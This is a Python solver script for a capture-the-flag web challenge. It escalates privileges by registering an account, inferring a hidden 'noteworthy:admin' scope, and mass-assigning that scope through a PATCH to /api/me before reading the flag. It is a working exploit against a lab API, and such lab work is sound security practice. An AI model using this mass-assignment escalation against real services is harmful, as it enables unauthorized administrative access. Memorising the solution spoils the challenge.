#!/usr/bin/env python3
"""Solve api-ai: enumerate the API, then a TWO-stage privilege escalation.

The old one-shot (register with is_admin=true) is patched. The chain now:
  1. register a normal account (register no longer accepts privilege fields),
  2. GET /api/me shows your scopes are `noteworthy:read` / `noteworthy:write` —
     the admin scope is NOT named anywhere, so infer `noteworthy:admin` from the
     read/write/admin pattern (the 403 is generic now; it doesn't leak it),
  3. note that PATCH /api/me rejects `role`/`is_admin` (the obvious escalation),
  4. but it mass-assigns any *other* field -> set `permissions` to the inferred
     string, then read the flag.

Usage:  python3 solve.py http://<host>:<port>     # e.g. http://localhost:5008
"""
import json
import secrets
import sys
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5008").rstrip("/")


def call(method, path, token=None, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read() or "null")
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or "null")


# 1. register a plain account. The in-memory user store persists for the
#    container's lifetime and has no reset, so use a fresh random username to avoid
#    a 409 when the solver is run more than once against the same instance.
username = "pwn_" + secrets.token_hex(4)
_, reg = call("POST", "/api/register", body={"username": username, "password": "pw"})
token = reg["token"]
print("registered:", reg)

# 2. the admin endpoint 403s with a generic message now. GET /api/me shows our
#    scopes are noteworthy:read / noteworthy:write, so the admin scope is the
#    obvious third in that namespace. Infer it; nothing hands it over.
code, denied = call("GET", "/api/admin/flag", token=token)
_, me = call("GET", "/api/me", token=token)
print(f"admin/flag -> {code}: {denied['detail']}; my scopes: {me['permissions']}")
perm = "noteworthy:admin"  # inferred from the read/write pattern above

# 3. the obvious escalations are blocked
for field in ("role", "is_admin"):
    code, resp = call("PATCH", "/api/me", token=token, body={field: "admin"})
    print(f"PATCH {{{field}}} -> {code}: {resp['detail']}")

# 4. but `permissions` is not protected -> mass-assign it
_, patched = call("PATCH", "/api/me", token=token, body={"permissions": [perm]})
print("after mass-assign:", patched)

code, flag = call("GET", "/api/admin/flag", token=token)
print("flag:", flag.get("flag"))
